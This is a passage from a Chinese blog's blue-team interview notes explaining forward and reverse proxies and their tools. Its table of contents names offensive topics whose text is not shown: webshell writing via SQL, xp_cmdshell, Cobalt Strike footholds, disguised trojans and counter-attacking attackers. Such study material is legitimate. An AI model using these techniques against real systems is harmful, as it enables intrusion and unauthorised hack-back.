+<h3 id="正向代理工具"><a href="#正向代理工具" class="headerlink" title="正向代理工具"></a>正向代理工具</h3><ul>
+<li>各类VPN</li>
+<li>burp suite</li>
+<li>fidder</li>
+<li>Charles</li>
+<li>EarthWorm</li>
+</ul>
+<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>在服务器端部署代理服务器（为了区分，将真正响应的服务器称为业务服务器），让代理服务器替业务服务器接收请求或发送响应。客户端发送一个请求给代理服务器，代理服务器接收请求并将请求发送给业务服务器，业务服务器将响应发送给代理服务器，代理服务器再将响应发送给客户端。</p>
+<p>在反向代理的过程中，<em>客户端不知道自己请求的是代理服务器还是业务服务器。</em></p>
+<h3 id="反向代理用途："><a href="#反向代理用途：" class="headerlink" title="反向代理用途："></a>反向代理用途：</h3><h4 id="1、隐藏服务器真实IP"><a href="#1、隐藏服务器真实IP" class="headerlink" title="1、隐藏服务器真实IP"></a>1、隐藏服务器真实IP</h4><p>在服务器端配置代理服务器可以隐藏服务器的真实IP，防止恶意攻击者的攻击。</p>
+<h4 id="2、负载均衡"><a href="#2、负载均衡" class="headerlink" title="2、负载均衡"></a>2、负载均衡</h4><p>代理服务器可以将对业务服务器的请求根据预设算法分发到业务服务器上。</p>
+<h4 id="3、提高访问速度"><a href="#3、提高访问速度" class="headerlink" title="3、提高访问速度"></a>3、提高访问速度</h4><p>对于静态页面的访问，代理服务器可以将数据存储到硬盘内，当出现有大量静态页面的访问时，可以直接从代理服务器获取响应。对于动态内容请求，代理服务器可以将缓存存在本地，提高访问响应速度。</p>
+<h4 id="4、提供安全障性"><a href="#4、提供安全障性" class="headerlink" title="4、提供安全障性"></a>4、提供安全障性</h4><p>可以将代理服务器作为应用层的防火墙，拦截恶意的Web攻击。还可以为后端服务器统一提供加密和SSL加速（如SSL终端代理），提供HTTP访问认证等。</p>
+<h3 id="反向代理工具"><a href="#反向代理工具" class="headerlink" title="反向代理工具"></a>反向代理工具</h3><ul>
+<li>nginx</li>
+<li>apache</li>
+<li>squid</li>
+<li>frp</li>
+</ul>
+<h3 id="正向代理和反向代理的异同点"><a href="#正向代理和反向代理的异同点" class="headerlink" title="正向代理和反向代理的异同点"></a>正向代理和反向代理的异同点</h3><h4 id="同："><a href="#同：" class="headerlink" title="同："></a>同：</h4><p>1、正向代理和反向代理中的服务器都是对请求和响应进行转发。<br>2、都能提高访问速度。<br>3、帮助客户端或业务服务器隐藏真实的IP。</p>
+<h4 id="异："><a href="#异：" class="headerlink" title="异："></a>异：</h4><p>1、部署的位置不同<br>正向代理部署在客户端，反向代理部署在服务器端。<br>2、作用不同<br>正向代理是客户端的代理，帮助客户端突破访问控制；反向代理是服务器的代理，帮助服务器实现负载均衡，安全防护。</p>
+<h2 id="使用过的安全设备"><a href="#使用过的安全设备" class="headerlink" title="使用过的安全设备"></a>使用过的安全设备</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46444606/article/details/114528599">常见安全设备总结</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://musewithwind.gitee.io">zha0fe1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://musewithwind.gitee.io/2023/06/23/0110%20HW%E9%9D%A2%E8%AF%95/">https://musewithwind.gitee.io/2023/06/23/0110%20HW%E9%9D%A2%E8%AF%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://musewithwind.gitee.io" target="_blank">暮色随风</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HW/">HW</a></div><div class="post_share"><div class="social-share" data-image="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/05/05/0108%20xhcms-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1/"><img class="next-cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">xhcms-报错注入审计</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/touxiang.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">zha0fe1</div><div class="author-info__description">江湖夜雨十年灯</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://m.weibo.cn/u/7713352758?uid=7713352758&amp;t=0&amp;luicode=10000011&amp;lfid=100103type%3D1%26q%3D%E5%AF%B9%E6%8A%97%E6%97%A0%E6%84%8F%E4%B9%89"><i class="fab fa-github"></i><span>More</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:1379887009@qq.com" target="_blank" title="Email"><i class="QQ"></i></a><a class="social-icon" href="https://github.com/suifen" target="_blank" title="Github"><i class="github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">回首向来萧瑟处,归去,也无风雨也无晴</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%93%9D%E5%88%9D"><span class="toc-number">1.</span> <span class="toc-text">蓝初</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E7%85%A7%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.1.</span> <span class="toc-text">按照注入点分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">字符型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">搜索型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E6%95%B0%E6%8D%AE%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">按数据提交方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#get%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">get注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#post%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">post注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">http头部注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E7%85%A7%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C"><span class="toc-number">1.1.3.</span> <span class="toc-text">按照执行效果</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dnslog%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">dnslog盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.3.5.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.1.3.6.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.3.7.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.3.8.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.3.9.</span> <span class="toc-text">二次注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%8B%BC%E6%8E%A5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.4.</span> <span class="toc-text">注入拼接位置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#where%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">where注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#order-by%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">order by注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#limit%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">limit注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#values%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">values注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-%E7%AB%AF%E5%8F%A3%E6%9F%A5%E7%9C%8B"><span class="toc-number">1.2.</span> <span class="toc-text">Linux 端口查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E6%9F%A5%E6%89%BE"><span class="toc-number">1.3.</span> <span class="toc-text">Windows隐藏用户查找</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">正则表达式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%99%E4%B8%80%E4%B8%AAIP%E5%A6%82%E4%BD%95%E6%BA%AF%E6%BA%90"><span class="toc-number">1.5.</span> <span class="toc-text">给一个IP如何溯源</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1Web%E6%97%A5%E5%BF%97-x2F-%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97-%E5%AF%BB%E6%89%BE%E9%81%97%E7%95%99%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.</span> <span class="toc-text">审计Web日志&#x2F;系统日志,寻找遗留信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8whois%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E4%BA%BA%E7%AD%89%E4%BF%A1%E6%81%AF-%E4%BD%BF%E7%94%A8IP%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7%E5%AE%9A%E4%BD%8D"><span class="toc-number">1.5.2.</span> <span class="toc-text">使用whois查询域名注册人等信息,使用IP定位工具定位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BIP%E7%9A%84dns%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95-MX%E8%AE%B0%E5%BD%95%E7%AD%89"><span class="toc-number">1.5.3.</span> <span class="toc-text">查看IP的dns历史记录,MX记录等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%BB%A5%E4%B8%8A%E6%93%8D%E4%BD%9C%E8%8E%B7%E5%8F%96%E5%AF%B9%E6%96%B9%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E5%A6%82%E5%A7%93%E6%B0%8F-%E6%89%8B%E6%9C%BA%E5%8F%B7%E7%AD%89-%E6%89%8B%E6%9C%BA%E5%8F%B7%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E7%BD%91%E7%AB%99-%E8%B7%9F%E8%BF%9B%E7%BD%91%E7%AB%99-%E5%9F%BA%E4%BA%8Ejsonp%E8%B7%A8%E5%9F%9F%E6%88%96%E5%AF%B9%E5%BA%94%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%89%BE%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9B%B4%E5%A4%9A%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.4.</span> <span class="toc-text">通过以上操作获取对方个人信息如姓氏,手机号等,手机号查询注册网站,跟进网站,基于jsonp跨域或对应网站信息泄露找到目标更多信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2%E8%9C%9C%E7%BD%90%E9%80%9A%E8%BF%87%E6%94%BB%E5%87%BB%E8%80%85%E8%A1%8C%E4%B8%BA%E8%8E%B7%E5%8F%96%E6%84%8F%E5%9B%BE"><span class="toc-number">1.5.5.</span> <span class="toc-text">部署蜜罐通过攻击者行为获取意图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E8%A3%85%E5%BF%85%E8%A6%81%E6%8F%92%E4%BB%B6%E6%9C%A8%E9%A9%AC%E7%9B%91%E6%8E%A7%E6%94%BB%E5%87%BB%E8%80%85"><span class="toc-number">1.5.6.</span> <span class="toc-text">伪装必要插件木马监控攻击者</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%AF%B9%E6%96%B9%E7%9A%84%E8%96%84%E5%BC%B1%E8%B5%84%E4%BA%A7-%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%88%B6"><span class="toc-number">1.5.7.</span> <span class="toc-text">攻击对方的薄弱资产,进行反制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shiro%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.</span> <span class="toc-text">shiro漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#550%E5%92%8C721%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.6.1.</span> <span class="toc-text">550和721的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E5%86%99webshell%E7%9A%84%E6%9D%A1%E4%BB%B6%E5%92%8C%E6%80%8E%E4%B9%88%E5%86%99"><span class="toc-number">1.7.</span> <span class="toc-text">SQL写webshell的条件和怎么写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E5%86%99%E5%85%A5WebShell%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.7.1.</span> <span class="toc-text">MySQL写入WebShell条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql%E5%86%99%E5%85%A5webshell%E6%80%8E%E6%A0%B7%E5%86%99"><span class="toc-number">1.7.2.</span> <span class="toc-text">Mysql写入webshell怎样写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8outfile%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">使用outfile方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#outfile%E5%86%99%E5%85%A5webshell%E6%93%8D%E4%BD%9C"><span class="toc-number">1.7.2.2.</span> <span class="toc-text">outfile写入webshell操作</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">1.7.2.2.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.7.2.2.2.</span> <span class="toc-text">确认注入点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8outfile%E5%86%99%E5%85%A5shell%E6%96%87%E4%BB%B6"><span class="toc-number">1.7.2.2.3.</span> <span class="toc-text">利用outfile写入shell文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Elog%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5%E6%B3%95"><span class="toc-number">1.7.2.3.</span> <span class="toc-text">基于log日志写入法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E6%97%A5%E5%BF%97%E5%86%99webshell%E6%93%8D%E4%BD%9C"><span class="toc-number">1.7.2.4.</span> <span class="toc-text">导入日志写webshell操作</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%86%E5%A4%87%EF%BC%9A"><span class="toc-number">1.7.2.4.1.</span> <span class="toc-text">准备：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%86%99%E5%85%A5%E6%97%A5%E5%BF%97%E5%86%8D%E8%AF%BB%E5%8F%96%E7%9A%84%E6%96%B9%E6%B3%95%E5%86%99webshell"><span class="toc-number">1.7.2.4.2.</span> <span class="toc-text">使用写入日志再读取的方法写webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mssql%E5%86%99%E5%85%A5webshell%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.7.3.</span> <span class="toc-text">Mssql写入webshell条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mssql%E5%86%99%E5%85%A5webshell%E6%80%8E%E6%A0%B7%E5%86%99"><span class="toc-number">1.7.4.</span> <span class="toc-text">Mssql写入webshell怎样写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8XP-cmdshel%E6%80%8E%E6%A0%B7l%E5%86%99%E5%85%A5Webshell%EF%BC%9F"><span class="toc-number">1.7.4.1.</span> <span class="toc-text">使用XP_cmdshel怎样l写入Webshell？</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%86%E5%A4%87%EF%BC%9A-1"><span class="toc-number">1.7.4.1.1.</span> <span class="toc-text">准备：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-number">1.7.4.1.2.</span> <span class="toc-text">查找网站目录的绝对路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8CCMD%E5%91%BD%E4%BB%A4%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.7.4.1.3.</span> <span class="toc-text">执行CMD命令查询</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8xp-cmdshell%E5%86%99%E5%85%A5WebShell"><span class="toc-number">1.7.4.1.4.</span> <span class="toc-text">使用xp_cmdshell写入WebShell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD%E6%80%8E%E6%A0%B7%E5%86%99%E5%85%A5WebShell"><span class="toc-number">1.7.4.2.</span> <span class="toc-text">使用差异备份怎样写入WebShell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD"><span class="toc-number">1.7.4.2.1.</span> <span class="toc-text">数据库备份</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%86WebShell%E4%BB%A3%E7%A0%81%E5%86%99%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD"><span class="toc-number">1.7.4.2.2.</span> <span class="toc-text">将WebShell代码写入数据库中</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8log%E5%A4%87%E4%BB%BD%E5%86%99%E5%85%A5WebShell"><span class="toc-number">1.7.4.3.</span> <span class="toc-text">使用log备份写入WebShell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ORACLE%E5%86%99%E5%85%A5WebShell%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.7.5.</span> <span class="toc-text">ORACLE写入WebShell条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle%E5%86%99webshell%E6%80%8E%E6%A0%B7%E5%86%99"><span class="toc-number">1.7.6.</span> <span class="toc-text">Oracle写webshell怎样写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E5%8C%85%E6%96%B9%E6%B3%95%E5%86%99%E5%85%A5Webshell"><span class="toc-number">1.7.6.1.</span> <span class="toc-text">使用文件访问包方法写入Webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CS%E5%A6%82%E4%BD%95%E4%B8%8A%E7%BA%BFWindows"><span class="toc-number">1.8.</span> <span class="toc-text">CS如何上线Windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86-x2F-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%88%E5%88%97%E4%B8%BE%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="toc-number">1.9.</span> <span class="toc-text">正向代理&#x2F;反向代理（列举工具）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.9.1.</span> <span class="toc-text">代理服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">1.9.2.</span> <span class="toc-text">正向代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E7%94%A8%E9%80%94"><span class="toc-number">1.9.3.</span> <span class="toc-text">正向代理的用途</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E7%AA%81%E7%A0%B4%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">1.9.3.1.</span> <span class="toc-text">1、突破访问控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%8F%90%E9%AB%98%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6"><span class="toc-number">1.9.3.2.</span> <span class="toc-text">2、提高访问速度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E9%9A%90%E8%97%8F%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9C%9F%E5%AE%9E%E7%9A%84IP"><span class="toc-number">1.9.3.3.</span> <span class="toc-text">3、隐藏客户端真实的IP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">1.9.4.</span> <span class="toc-text">正向代理工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">1.9.5.</span> <span class="toc-text">反向代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%94%A8%E9%80%94%EF%BC%9A"><span class="toc-number">1.9.6.</span> <span class="toc-text">反向代理用途：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9C%9F%E5%AE%9EIP"><span class="toc-number">1.9.6.1.</span> <span class="toc-text">1、隐藏服务器真实IP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1"><span class="toc-number">1.9.6.2.</span> <span class="toc-text">2、负载均衡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E6%8F%90%E9%AB%98%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6"><span class="toc-number">1.9.6.3.</span> <span class="toc-text">3、提高访问速度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E6%8F%90%E4%BE%9B%E5%AE%89%E5%85%A8%E9%9A%9C%E6%80%A7"><span class="toc-number">1.9.6.4.</span> <span class="toc-text">4、提供安全障性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">1.9.7.</span> <span class="toc-text">反向代理工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E5%BC%82%E5%90%8C%E7%82%B9"><span class="toc-number">1.9.8.</span> <span class="toc-text">正向代理和反向代理的异同点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%EF%BC%9A"><span class="toc-number">1.9.8.1.</span> <span class="toc-text">同：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%EF%BC%9A"><span class="toc-number">1.9.8.2.</span> <span class="toc-text">异：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%BF%87%E7%9A%84%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="toc-number">1.10.</span> <span class="toc-text">使用过的安全设备</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/23/0110%20HW%E9%9D%A2%E8%AF%95/" title="蓝初面试"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝初面试"/></a><div class="content"><a class="title" href="/2023/06/23/0110%20HW%E9%9D%A2%E8%AF%95/" title="蓝初面试">蓝初面试</a><time datetime="2023-06-23T01:55:00.000Z" title="发表于 2023-06-23 09:55:00">2023-06-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/05/0108%20xhcms-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1/" title="xhcms-报错注入审计"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="xhcms-报错注入审计"/></a><div class="content"><a class="title" href="/2023/05/05/0108%20xhcms-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AE%A1%E8%AE%A1/" title="xhcms-报错注入审计">xhcms-报错注入审计</a><time datetime="2023-05-05T07:00:00.000Z" title="发表于 2023-05-05 15:00:00">2023-05-05</time></div></div><div class="aside-list-item"><a 